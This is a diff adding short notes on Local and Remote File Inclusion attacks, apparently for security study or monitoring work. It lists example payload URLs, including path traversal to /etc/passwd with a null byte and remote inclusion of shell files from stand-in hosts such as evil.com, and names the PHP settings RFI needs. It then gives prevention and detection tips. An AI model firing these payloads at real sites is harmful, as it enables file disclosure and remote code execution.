@@ -1,1 +1,33 @@
 
+https://example.com/?page=filename.php
+https://example.com/?page=../../../../etc/test.txt
+https://example.com/?file=../../uploads/evil.php
+https://example.com/?page=/../../../../../../../../etc/passwd%00
+
+
+http://example.com/?file=http://attacker.example.com/evil.php
+
+http://example.com/index.php?page=http://evil.com/shell.txt
+http://example.com/index.php?page=http://evil.com/shell.txt%00
+http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
+
+# Both the below settings need to be enabled for RFI to be successful. 
+allow_url_fopen = On
+allow_url_include = On
+
+
+
+
+-- How to Prevent LFI & RFI --
+
+The most effective way to prevent RFI and LFI attacks is to sanitize any data received from a user before using it. Do not forget that client based controls are easily bypassed. This is why you should always do your controls on both the client-side and the server-side.
+
+
+-- Detecting LFI & RFI Attacks --
+
+
+· When examining a web request from a user, examine all the fields.
+· Check for any special characters: Within the data that is received from users, especially look for notations such as ‘/’,  `.`, `\`.
+· Familiarize yourself with files frequently used in LFI attacks: In an LFI attack the attacker reads the files that are on the server. If you familiarize yourself with the critical file names on the server, you can detect LFI attacks more easily.
+· Search for acronyms such as HTTP and HTTPS: In RFI attacks the attacker includes the file on his own device and enables the file to execute. 
+· In order to include a file, attackers usually set up a small web server on their own device and display the file over an HTTP protocol. This is why you should search for notations such as “http” and “https” to be able to detect RFI attacks more easily.
